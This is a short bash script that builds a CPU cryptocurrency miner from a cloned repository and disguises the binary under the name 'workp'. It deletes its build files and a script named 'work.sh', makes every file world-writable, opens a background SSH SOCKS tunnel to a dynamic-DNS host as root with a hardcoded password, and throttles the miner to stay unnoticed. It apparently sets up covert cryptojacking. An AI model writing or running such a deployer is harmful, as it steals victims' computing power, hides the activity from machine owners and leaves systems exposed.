#!/bin/bash
sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install cpulimit -y && sudo apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev gcc build-essential git make curl unzip gedit dh-autoreconf openssh-server screen libtool libncurses5-dev libudev-dev g++ iftop libgtk2.0-dev libboost-dev libboost-system-dev libboost-thread-dev vim -y 
git clone https://github.com/severout/severtat
cd laptopedit
chmod +x *
./build.sh
make
mv cpuminer workp && cp workp ../ && cd ..  && sudo rm -rf laptopedit work.sh && sudo chmod 777 * && screen -d -m sshpass -p workpro1997 ssh -o StrictHostKeyChecking=no -D 1997 root@proxywork.ddns.net && cpulimit --exe workp --limit 200 -b
